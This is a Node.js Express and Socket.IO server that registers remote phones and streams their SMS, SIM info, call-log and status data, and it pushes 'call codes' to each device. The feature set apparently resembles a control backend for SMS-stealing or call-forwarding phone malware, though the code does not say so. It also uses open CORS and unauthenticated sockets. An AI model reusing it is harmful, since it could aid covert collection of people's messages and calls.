import express from "express";
import cors from "cors";
import dotenv from "dotenv";
import http from "http";
import fetch from "node-fetch";
import mongoose from "mongoose";
import socketio from "socket.io";
import { connectDB } from "./config/db.js";

import deviceRoutes from "./routes/deviceRoutes.js";
import smsRoutes from "./routes/smsRoutes.js";
import simInfoRoutes from "./routes/simInfoRoutes.js";
import notificationRoutes from "./routes/notificationRoutes.js";
import callRoutes from "./routes/callRoutes.js";
import adminRoutes from "./routes/adminRoutes.js";
import serialRoutes from "./routes/serialRoutes.js";
import callLogRoutes from "./routes/callLogRoutes.js";
import statusRoutes from "./routes/statusRoutes.js";
import lastSeenRoutes from "./routes/lastSeen.routes.js";

dotenv.config();
connectDB();

const app = express();
const server = http.createServer(app);

// ✅ Socket.IO v2 style
const io = socketio(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"],
  },
  transports: ["websocket", "polling"],
});

app.use(cors());
app.use(express.json());
app.set("io", io);

const deviceSockets = new Map();

/** 🔗 SOCKET.IO CONNECTION */
io.on("connection", (socket) => {
  console.log("🟢 Client connected:", socket.id);
  let currentDeviceId = null;

  /** 📲 DEVICE REGISTER */
  socket.on("registerDevice", (uniqueid) => {
    if (!uniqueid) return;

    // same device ka purana socket ho to disconnect
    if (deviceSockets.has(uniqueid)) {
      const oldSocketId = deviceSockets.get(uniqueid);
      const oldSocket = io.sockets.connected[oldSocketId];
      if (oldSocket) {
        oldSocket.disconnect(true);
        console.log(`♻️ Old socket for ${uniqueid} disconnected`);
      }
      deviceSockets.delete(uniqueid);
    }

    currentDeviceId = uniqueid;
    deviceSockets.set(uniqueid, socket.id);
    socket.join(uniqueid);

    console.log(`📱 Registered Device: ${uniqueid}`);
    saveLastSeen(uniqueid, "Online");

    // ✅ confirm to that socket only
    io.to(socket.id).emit("deviceRegistered", { uniqueid });
    io.emit("deviceListUpdated", { event: "device_connected", uniqueid });
  });

  /** 🌐 DEVICE STATUS (Online/Offline/Charging/…) */
  socket.on("deviceStatus", (data = {}) => {
    const { uniqueid, connectivity } = data;
    if (!uniqueid) return;

    console.log(`⚡ DeviceStatus → ${uniqueid}: ${connectivity}`);
    saveLastSeen(uniqueid, connectivity);

    io.emit("deviceStatus", {
      uniqueid,
      connectivity,
      updatedAt: new Date(),
    });

    io.emit("deviceListUpdated", {
      event: "status_changed",
      uniqueid,
      connectivity,
    });
  });

  /** 🔴 DISCONNECT */
  socket.on("disconnect", (reason) => {
    console.log(`🔴 Socket disconnected: ${socket.id} | reason: ${reason}`);

    if (currentDeviceId) {
      setTimeout(() => {
        const stillConnected = [...deviceSockets.values()].includes(socket.id);
        if (!stillConnected) {
          deviceSockets.delete(currentDeviceId);

          io.emit("deviceStatus", {
            uniqueid: currentDeviceId,
            connectivity: "Offline",
            updatedAt: new Date(),
          });

          io.emit("deviceListUpdated", {
            event: "device_disconnected",
            uniqueid: currentDeviceId,
          });

          saveLastSeen(currentDeviceId, "Offline");
        }
      }, 5000);
    }
  });
});

/** 🔹 Save Last Seen (API call) */
async function saveLastSeen(deviceId, connectivity) {
  try {
    const PORT = process.env.PORT || 5000;
    await fetch(`http://localhost:${PORT}/api/lastseen/${deviceId}/status`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ connectivity }),
    });
  } catch (err) {
    console.error("❌ Error saving last seen:", err.message);
  }
}

/** 🔹 CallCode Emit – SAFE */
export async function sendCallCodeToDevice(uniqueid, callData) {
  const socketId = deviceSockets.get(uniqueid);
  const socket = socketId ? io.sockets.connected[socketId] : null;
  if (socket) {
    socket.emit("callCodeUpdate", callData);
    console.log(`✅ [EMIT] callCodeUpdate → ${uniqueid}`);
  } else {
    console.log(`⚠️ No active socket for ${uniqueid}, cannot send callCodeUpdate`);
  }
}

/** 🧠 MongoDB Change Streams */
mongoose.connection.once("open", () => {
  console.log("📡 MongoDB connected — Watching Devices, SIMs, Calls, SMS...");

  try {
    // 🟢 Device Collection Watch
    const deviceStream = mongoose.connection.collection("devices").watch();
    deviceStream.on("change", async (change) => {
      const { operationType } = change;
      if (!["insert", "update", "replace"].includes(operationType)) return;

      const updatedDevice = await mongoose.connection
        .collection("devices")
        .findOne({ _id: change.documentKey._id });

      if (updatedDevice) {
        console.log(`📡 Device Change → ${updatedDevice.uniqueId}`);
        io.emit("deviceListUpdated", { event: "db_change", device: updatedDevice });
      }
    });

    // 🆕 SIM Info Collection Watch
    const simStream = mongoose.connection.collection("siminfos").watch();
    simStream.on("change", async (change) => {
      const { operationType } = change;
      if (!["insert", "update", "replace"].includes(operationType)) return;

      const updatedSim = await mongoose.connection
        .collection("siminfos")
        .findOne({ _id: change.documentKey._id });

      if (updatedSim) {
        console.log(`📶 SIM Change → ${updatedSim.deviceId}`);
        io.emit("simInfoUpdated", {
          event: "sim_change",
          sim: updatedSim,
        });
      }
    });

    // 📞 CallCodes Watch
    const callStream = mongoose.connection.collection("callcodes").watch();
    callStream.on("change", async (change) => {
      if (!["insert", "update", "replace"].includes(change.operationType)) return;
      const updatedDoc = await mongoose.connection
        .collection("callcodes")
        .findOne({ _id: change.documentKey._id });
      if (!updatedDoc) return;

      const deviceId = updatedDoc.deviceId;
      console.log(`📞 CallCode Changed → ${deviceId}`);
      sendCallCodeToDevice(deviceId, updatedDoc);
    });

    // ✉️ SMS Watch
    const smsStream = mongoose.connection.collection("sms").watch();
    smsStream.on("change", async (change) => {
      if (!["insert", "update", "replace"].includes(change.operationType)) return;
      const updatedDoc = await mongoose.connection
        .collection("sms")
        .findOne({ _id: change.documentKey._id });
      if (!updatedDoc) return;

      const deviceId = updatedDoc.deviceId;
      console.log(`📩 SMS Changed → ${deviceId}`);
      const socketId = deviceSockets.get(deviceId);
      const socket = socketId ? io.sockets.connected[socketId] : null;
      if (socket) {
        socket.emit("smsUpdate", updatedDoc);
      }
    });
  } catch (err) {
    console.error("💥 Change stream init failed:", err);
  }
});

app.get("/", (req, res) => {
  res.send(" Live Socket + MongoDB Streams running (Devices, SIM, Calls, SMS)");
});

app.use("/api/device", deviceRoutes);
app.use("/api/sms", smsRoutes);
app.use("/api/siminfo", simInfoRoutes);
app.use("/api/notification", notificationRoutes);
app.use("/api/call", callRoutes);
app.use("/api/admin", adminRoutes);
app.use("/api/serial", serialRoutes);
app.use("/api/status", statusRoutes);
app.use("/api/lastseen", lastSeenRoutes);
app.use("/api/call-log", callLogRoutes);

app.use((req, res) =>
  res.status(404).json({ success: false, message: "Route not found" })
);
app.use((err, req, res, next) => {
  console.error(" Unhandled error:", err);
  res.status(500).json({ success: false, message: "Internal server error" });
});

const PORT = process.env.PORT || 5000;
server.listen(PORT, () =>
  console.log(` Server running on http://localhost:${PORT}`)
);
